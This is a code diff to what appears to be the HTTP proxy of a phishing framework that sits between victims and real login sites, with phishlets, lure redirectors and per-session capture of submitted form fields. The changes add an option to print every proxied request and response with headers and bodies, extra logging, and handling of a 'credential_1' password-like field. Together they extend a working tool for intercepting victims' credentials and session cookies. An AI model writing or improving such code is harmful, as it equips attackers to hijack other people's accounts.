@@ -203,6 +203,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+
+			if p.cfg.IsShowRequestsEnabled() {
+				fmt.Printf("\nRequest:\n%s %s\n", req.Method, req.URL.String())
+				for name, headers := range req.Header {
+					for _, h := range headers {
+						fmt.Printf("%s: %s\n", name, h)
+					}
+				}
+			}
+
 			p.current_url = req.URL
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
@@ -557,6 +567,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("lure: redirector file does not exist: %s", index_found)
 									}
 								}
+								log.Debug("forwarder URL detected, %s not serving lure redirector", req_path)
 							}
 						} else if s.RedirectorName != "" {
 							// session has already triggered a lure redirector - see if there are any files requested by the redirector
@@ -629,6 +640,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
+					} else{
+						log.Error("Err: %s", err.Error())
 					}
 				}
 
@@ -843,7 +856,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								for k, v := range req.PostForm {
 									if len(v) > 0 {
-										if k == "password" {
+										if k == "password" || k == "credential_1" {
 											log.Debug("POST %s = %s - session_id=%s", k, redactString(v[0]), ps.SessionId)
 
 										} else {
@@ -931,6 +944,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			if resp == nil {
 				return nil
+			}
+
+			if p.cfg.IsShowRequestsEnabled() {
+				//print proxy info
+				fmt.Printf("\nRequest:\n%s %s %s\n", resp.Request.Method, resp.Request.URL.String(), resp.Request.Proto)
+				for name, headers := range resp.Request.Header {
+					for _, h := range headers {
+						fmt.Printf("%s: %s\n", name, h)
+					}
+				}
+				if resp.Request.Body != nil {
+					body, err := ioutil.ReadAll(resp.Request.Body)
+					if err == nil {
+						resp.Request.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+						fmt.Printf("%s\n", string(body))
+					}
+				}
+
+				//print response info
+				fmt.Printf("\nResponse:\n%s %s\n", resp.Proto, resp.Status)
+				for name, headers := range resp.Header {
+					for _, h := range headers {
+						fmt.Printf("%s: %s\n", name, h)
+					}
+				}
+				body, err := ioutil.ReadAll(resp.Body)
+				if err == nil {
+					resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+					fmt.Printf("%s\n", string(body))
+				}
 			}
 
 			// handle session
@@ -1742,7 +1785,8 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 			}
 		}
 	}
-
+	// something went wrong logging
+	log.Warning("getPhishletByPhishHost Error - hostname: %s not found", hostname)
 	return nil
 }
 
